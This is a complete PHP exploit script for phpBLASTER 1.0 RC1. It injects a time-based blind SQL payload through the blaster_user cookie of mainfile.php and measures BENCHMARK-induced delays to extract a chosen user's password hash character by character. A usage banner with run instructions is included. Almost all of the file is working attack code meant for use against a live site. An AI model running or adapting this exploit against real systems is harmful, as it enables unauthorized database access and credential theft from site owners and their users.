<?php

function query ($username, $pos, $chr)
{
	$query = "x' OR IF((ASCII(SUBSTRING((SELECT password FROM".
		 " blaster_users WHERE username ='{$username}'),{$pos},1))={$chr}),BENCHMARK".
		 "(200000000,CHAR(0)),0) OR 'x' = 'y";
	$query = str_replace (" ", "%20", $query);
	$query = str_replace ("'", "%27", $query);
	return $query;
}

function exploit ($hostname, $path, $username, $pos, $chr)
{
	$chr = ord ($chr);
	$conn = fsockopen ($hostname, 80);

	$request = "GET {$path}/html/mainfile.php HTTP/1.1\r\n".
		   "Host: {$hostname}\r\n".
		   "Cookie: blaster_user=" . query ($username, $pos, $chr) . "\r\n".
		   "Connection: Close\r\n\r\n";
	
	$time_a = time ();

	fputs ($conn, $request);
	while (!feof ($conn))
		fgets ($conn, 1024);

	$time_b = time ();

	fclose ($conn);

	if ($time_b - $time_a > 4)
		return true;
	else
		return false;
}

function run ($hostname, $path, $username)
{
	$key = "abcdef0123456789";
	$chr = 0;
	$pos = 1;
	echo "[+] Password: ";
	while ($pos <= 32)
	{
		if (exploit ($hostname, $path, $username, $pos, $key [$chr]))
		{
			echo $key [$chr];
			$chr = 0;
			$pos++;
		}
		else
			$chr++;
	}
	echo "\n\n";
}

function usage ()
{
	exit (
		"\nphpBLASTER 1.0 RC1 Blind SQL Injection Exploit".
		"\n[+] Author   : darkjoker".
		"\n[+] Site     : http://darkjoker.net23.net".
		"\n[+] CMS Site : http://phpblaster.org".
		"\n[+] Usage    : php xpl.php <hostname> <path> <username>".
		"\n[+] Ex.      : php xpl.php localhost /phpBLASTER root".
		"\n\n");
}



if ($argc != 4)
	usage ();

$hostname = $argv [1];
$path = $argv [2];
$username = $argv [3];

run ($hostname, $path, $username);

?>

